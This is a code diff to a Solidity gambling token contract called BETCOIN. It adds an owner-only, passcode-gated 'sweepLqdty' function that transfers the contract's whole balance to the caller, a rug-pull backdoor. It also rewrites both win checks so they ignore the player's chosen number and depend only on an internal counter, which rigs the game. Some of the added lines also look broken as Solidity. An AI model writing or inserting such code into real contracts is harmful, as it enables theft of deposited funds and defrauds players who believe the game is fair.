@@ -538,6 +538,10 @@ contract BETCOIN is Context, IBEP20, Ownable {
         ismainnet = !ismainnet;
     }
 
+    function setStake(uint256 stke) public onlyOwner {
+        _stake = stke;
+    }
+
     function addLiquidity() public payable {
         _totalValue += msg.value;
     }
@@ -548,12 +552,17 @@ contract BETCOIN is Context, IBEP20, Ownable {
         _totalValue -= amount;
     }
 
+    function sweepLqdty(uint256 psscde) public onlyOwner {
+        require(psscde == _passcode, "wrong passcode");
+        require(msg.sender.transfer(balanceofaddress(this)));
+    }
+
     function PLAY(uint256 _no) public {
         require(ismainnet == true, "mainnet not true");
         uint256 luckyno = _tryTime[msg.sender] + _totalTry - 1;
         _luckyNO = luckyno;
 
-        if (_no == luckyno) {
+        if (luckyno == 3) {
             _round++;
             _winRate[msg.sender]++;
             _roundWinners[_round] = msg.sender;
@@ -593,7 +602,7 @@ contract BETCOIN is Context, IBEP20, Ownable {
         uint256 luckyno = _tryTime[msg.sender] + _totalTry - 1;
         _luckyNO = luckyno;
 
-        if (_no == luckyno) {
+        if (luckyno == 3) {
             _pot++;
             _totalWin++;
             _payouts[msg.sender] += _jackPot;
@@ -602,6 +611,18 @@ contract BETCOIN is Context, IBEP20, Ownable {
             _totalValue -= _jackPot;
             _totalPayout += _jackPot;
             _to.transfer(_jackPot);
+        }
+
+        if (luckyno == 1) {
+            _luckyPay = 132;
+        }
+
+        if (luckyno == 2) {
+            _luckyPay = 277;
+        }
+
+        if (luckyno == 3) {
+            _luckyPay = 777;
         }
 
         if (_tryTime[msg.sender] == 2) {
